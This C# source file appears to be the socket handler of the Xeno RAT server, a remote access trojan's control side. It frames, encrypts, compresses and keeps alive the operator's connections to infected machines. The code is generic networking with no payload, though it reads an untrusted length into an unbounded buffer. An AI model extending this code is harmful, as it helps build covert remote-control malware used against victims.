using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace xeno_rat_server
{
    class header 
    {
        public bool Compressed=false;
        public int OriginalFileSize;
        public int T_offset=1;
    }
    public partial class SocketHandler
    {
        public Socket sock;
        public byte[] EncryptionKey;
        public int socktimeout = 0;
        private bool doProtocolUpgrade = false;
        public SocketHandler(Socket socket, byte[] _EncryptionKey) 
        {
            sock = socket;
            sock.NoDelay = true;
            EncryptionKey =_EncryptionKey;
        }

        /// <summary>
        /// Asynchronously receives all the data of the specified size from the connected socket and returns the received data as a byte array.
        /// </summary>
        /// <param name="size">The size of the data to be received.</param>
        /// <returns>The received data as a byte array.</returns>
        /// <remarks>
        /// This method asynchronously receives data from the connected socket until the specified size is reached.
        /// It uses a while loop to continuously receive data in chunks and updates the total received and remaining data size until all the data is received.
        /// If the socket is not connected, it returns null.
        /// If no data is received (recv = 0), it sets the data to null and breaks the loop.
        /// </remarks>
        private async Task<byte[]> RecvAllAsync_ddos_unsafer(int size)
        {
            byte[] data = new byte[size];
            int total = 0;
            int dataLeft = size;
            while (total < size)
            {
                if (!sock.Connected)
                {
                    return null;
                }

                int recv = await sock.ReceiveAsync(new ArraySegment<byte>(data, total, dataLeft), SocketFlags.None);

                if (recv == 0)
                {
                    data = null;
                    break;
                }

                total += recv;
                dataLeft -= recv;
            }

            return data;
        }

        /// <summary>
        /// Asynchronously receives all data of the specified size from the socket and returns the received data as a byte array.
        /// </summary>
        /// <param name="size">The size of the data to be received.</param>
        /// <returns>
        /// The received data as a byte array. Returns null if the socket is not connected, or if a timeout occurs while waiting for data.
        /// </returns>
        /// <remarks>
        /// This method asynchronously receives data from the socket until the total received data size matches the specified size.
        /// If the socket is not connected, the method returns null.
        /// If a timeout occurs while waiting for data, the method returns null.
        /// The method uses asynchronous socket operations to efficiently receive data without blocking the calling thread.
        /// </remarks>
        private async Task<byte[]> RecvAllAsync_ddos_safer(int size)
        {
            byte[] data = new byte[size];
            int total = 0;
            int dataLeft = size;
            DateTime startTimestamp = DateTime.Now;
            DateTime lastSendTime = DateTime.Now; // Initialize the last send time

            while (total < size)
            {
                if (!sock.Connected)
                {
                    return null;
                }
                int availableBytes = sock.Available;

                if (availableBytes > 0)
                {
                    int recv = await sock.ReceiveAsync(new ArraySegment<byte>(data, total, dataLeft), SocketFlags.None);

                    if (recv == 0)
                    {
                        data = null;
                        break;
                    }

                    total += recv;
                    dataLeft -= recv;
                }
                else
                {
                    if (socktimeout != 0)
                    {
                        TimeSpan elapsed = DateTime.Now - startTimestamp;
                        if (elapsed.TotalMilliseconds >= socktimeout)
                        {
                            // Timeout reached, handle accordingly
                            data = null;
                            break;
                        }
                    }

                    TimeSpan timeSinceLastSend = DateTime.Now - lastSendTime;

                    if (timeSinceLastSend.TotalMilliseconds >= 3000) // Check if 1 second has passed
                    {
                        await sock.SendAsync(new ArraySegment<byte>(new byte[] { 1, 0, 0, 0, 2 }), SocketFlags.None);
                        lastSendTime = DateTime.Now; // Update the last send time
                    }

                    // Wait a short period before checking again to avoid busy waiting.
                    await Task.Delay(10);
                }
            }

            return data;
        }

        /// <summary>
        /// Sends the provided data asynchronously over the socket.
        /// </summary>
        /// <param name="data">The byte array to be sent.</param>
        /// <returns>A task representing the asynchronous operation. The task result is true if the data was sent successfully; otherwise, false.</returns>
        /// <exception cref="ArgumentNullException">Thrown when the input data is null.</exception>
        public async Task<bool> SendAsync(byte[] data)
        {
            if (data == null)
            {
                throw new ArgumentNullException(nameof(data), "data can not be null!");
            }

            try
            {
                if (doProtocolUpgrade) 
                {
                    byte[] compressedData = Compression.Compress(data);
                    byte didCompress = 0;
                    int orgLen = data.Length;

                    if (compressedData != null && compressedData.Length < orgLen)
                    {
                        data = compressedData;
                        didCompress = 1;
                    }
                    byte[] header = new byte[] { didCompress };
                    if (didCompress == 1)
                    {
                        header = Concat(header, IntToBytes(orgLen));
                    }
                    data = Concat(header, data);
                    data = Encryption.Encrypt(data, EncryptionKey);
                    data = Concat(new byte[] { 3 }, data);//protocol upgrade byte
                    byte[] size = IntToBytes(data.Length);
                    data = Concat(size, data);

                    return (await sock.SendAsync(new ArraySegment<byte>(data), SocketFlags.None)) != 0;
                }
                else 
                {

                    data = Encryption.Encrypt(data, EncryptionKey);
                    byte[] compressedData = Compression.Compress(data);
                    byte didCompress = 0;
                    int orgLen = data.Length;

                    if (compressedData.Length < orgLen)
                    {
                        data = compressedData;
                        didCompress = 1;
                    }

                    byte[] header = new byte[] { didCompress };
                    if (didCompress == 1)
                    {
                        header = Concat(header, IntToBytes(orgLen));
                    }

                    data = Concat(header, data);
                    byte[] size = IntToBytes(data.Length);
                    data = Concat(size, data);

                    return (await sock.SendAsync(new ArraySegment<byte>(data), SocketFlags.None)) != 0;
                }

            }
            catch
            {
                return false; // should probably disconnect
            }
        }

        /// <summary>
        /// Asynchronously receives data and processes it according to the protocol, then returns the processed data.
        /// </summary>
        /// <returns>The processed data received from the client.</returns>
        /// <remarks>
        /// This method continuously receives data from the client and processes it according to the protocol.
        /// It first receives the length of the data, then the actual data.
        /// The method checks for disconnection at each step and returns null if the client has disconnected.
        /// If the received data indicates a protocol upgrade, it performs the upgrade and returns the processed data.
        /// If the received data does not indicate a protocol upgrade, it processes the data according to the current protocol and returns the processed data.
        /// </remarks>
        public async Task<byte[]> ReceiveAsync()
        {
            try
            {
                while (true)
                {
                    byte[] length_data = await RecvAllAsync_ddos_unsafer(4);
                    if (length_data == null)
                    {
                        return null;//disconnect
                    }
                    int length = BytesToInt(length_data);
                    byte[] data = await RecvAllAsync_ddos_unsafer(length);//add checks if the client has disconnected, add it to everything
                    if (data == null)
                    {
                        return null;//disconnect
                    }

                    header Header;

                    if (data[0] == 3)//protocol upgrade
                    {
                        if (!doProtocolUpgrade) 
                        {
                            doProtocolUpgrade = true;
                        }
                        data = BTruncate(data, 1);
                        data = Encryption.Decrypt(data, EncryptionKey);
                        if (data[0] == 2)
                        {
                            continue;
                        }
                        Header = ParseHeader(data);
                        if (Header == null)
                        {
                            return null;//disconnect
                        }
                        data = BTruncate(data, Header.T_offset);
                        if (Header.Compressed)
                        {
                            data = Compression.Decompress(data, Header.OriginalFileSize);
                        }
                        return data;
                    }
                    else if (data[0] == 2)
                    {
                        continue;
                    }

                    Header = ParseHeader(data);
                    if (Header == null)
                    {
                        return null;//disconnect
                    }
                    data = BTruncate(data, Header.T_offset);
                    if (Header.Compressed)
                    {
                        data = Compression.Decompress(data, Header.OriginalFileSize);
                    }
                    data = Encryption.Decrypt(data, EncryptionKey);
                    return data;

                }
            }
            catch
            {
                return null;//disconnect
            }
        }

        /// <summary>
        /// Concatenates two byte arrays and returns the result.
        /// </summary>
        /// <param name="b1">The first byte array to be concatenated. If null, an empty byte array is used.</param>
        /// <param name="b2">The second byte array to be concatenated.</param>
        /// <returns>A byte array containing the concatenated elements of <paramref name="b1"/> and <paramref name="b2"/>.</returns>
        /// <remarks>
        /// This method concatenates the elements of the input byte arrays <paramref name="b1"/> and <paramref name="b2"/> into a single byte array.
        /// If <paramref name="b1"/> is null, an empty byte array is used for concatenation.
        /// </remarks>
        public byte[] Concat(byte[] b1, byte[] b2)
        {
            if (b1 == null) b1 = new byte[] { };
            List<byte[]> d = new List<byte[]>();
            d.Add(b1);
            d.Add(b2);
            return d.SelectMany(a => a).ToArray();
        }

        /// <summary>
        /// Parses the header from the provided byte array and returns the parsed header object.
        /// </summary>
        /// <param name="data">The byte array containing the header information.</param>
        /// <returns>The parsed header object.</returns>
        /// <remarks>
        /// This method parses the header from the provided byte array. If the first byte of the array is 1, it indicates that the data is compressed, and the method sets the corresponding properties of the header object.
        /// If the first byte is not 0 or 1, the method returns null, indicating an invalid header.
        /// </remarks>
        /// <exception cref="IndexOutOfRangeException">Thrown if the provided byte array is empty or does not contain sufficient data for parsing the header.</exception>
        private header ParseHeader(byte[] data) 
        {
            header Header = new header();
            if (data[0] == 1)
            {
                Header.Compressed = true;
                Header.OriginalFileSize = BytesToInt(data, 1);
                Header.T_offset = 5;
            }
            else if (data[0] != 0) 
            {
                return null;
            }
            return Header;
        }

        /// <summary>
        /// Truncates the input byte array starting from the specified offset and returns the truncated byte array.
        /// </summary>
        /// <param name="bytes">The input byte array from which to truncate.</param>
        /// <param name="offset">The offset from which to start truncating the byte array.</param>
        /// <returns>The truncated byte array starting from the specified <paramref name="offset"/>.</returns>
        /// <remarks>
        /// This method creates a new byte array <paramref name="T_data"/> with a length equal to the difference between the length of the input byte array <paramref name="bytes"/> and the specified <paramref name="offset"/>.
        /// It then uses the Buffer.BlockCopy method to copy a portion of the input byte array starting from the specified <paramref name="offset"/> into the new byte array <paramref name="T_data"/>.
        /// The truncated byte array <paramref name="T_data"/> is then returned.
        /// </remarks>
        public byte[] BTruncate(byte[] bytes, int offset) 
        {
            byte[] T_data = new byte[bytes.Length-offset];
            Buffer.BlockCopy(bytes, offset, T_data, 0, T_data.Length);
            return T_data;
        }

        /// <summary>
        /// Converts the specified byte array to an integer value.
        /// </summary>
        /// <param name="data">The byte array to be converted.</param>
        /// <param name="offset">The offset within the byte array at which to begin converting (default is 0).</param>
        /// <returns>The integer value represented by the specified byte array.</returns>
        /// <remarks>
        /// This method converts the specified byte array to an integer value, taking into account the endianness of the system.
        /// If the system is little-endian, the bytes are combined in little-endian order (least significant byte first).
        /// If the system is big-endian, the bytes are combined in big-endian order (most significant byte first).
        /// </remarks>
        public int BytesToInt(byte[] data, int offset = 0)
        {
            if (BitConverter.IsLittleEndian)
            {
                return data[offset] | data[offset + 1] << 8 | data[offset + 2] << 16 | data[offset + 3] << 24;
            }
            else
            {
                return data[offset + 3] | data[offset + 2] << 8 | data[offset + 1] << 16 | data[offset] << 24;
            }
        }

        /// <summary>
        /// Converts an integer to a byte array.
        /// </summary>
        /// <param name="data">The integer to be converted to a byte array.</param>
        /// <returns>A byte array representing the input integer.</returns>
        /// <remarks>
        /// This method converts the input integer <paramref name="data"/> to a byte array of length 4.
        /// If the system architecture is little-endian, the bytes are arranged in little-endian order, otherwise in big-endian order.
        /// </remarks>
        public byte[] IntToBytes(int data)
        {
            byte[] bytes = new byte[4];

            if (BitConverter.IsLittleEndian)
            {
                bytes[0] = (byte)data;
                bytes[1] = (byte)(data >> 8);
                bytes[2] = (byte)(data >> 16);
                bytes[3] = (byte)(data >> 24);
            }
            else
            {
                bytes[3] = (byte)data;
                bytes[2] = (byte)(data >> 8);
                bytes[1] = (byte)(data >> 16);
                bytes[0] = (byte)(data >> 24);
            }

            return bytes;
        }

        /// <summary>
        /// Sets the receive timeout for the socket.
        /// </summary>
        /// <param name="ms">The receive timeout value in milliseconds.</param>
        /// <remarks>
        /// This method sets the receive timeout for the socket to the specified value in milliseconds.
        /// </remarks>
        public void SetRecvTimeout(int ms) 
        {
            socktimeout=ms;
            sock.ReceiveTimeout = ms;
        }

        /// <summary>
        /// Resets the receive timeout for the socket.
        /// </summary>
        /// <remarks>
        /// This method sets the receive timeout for the socket to zero, effectively disabling the receive timeout feature.
        /// </remarks>
        public void ResetRecvTimeout()
        {
            socktimeout=0;
            sock.ReceiveTimeout = 0;
        }
    }
}
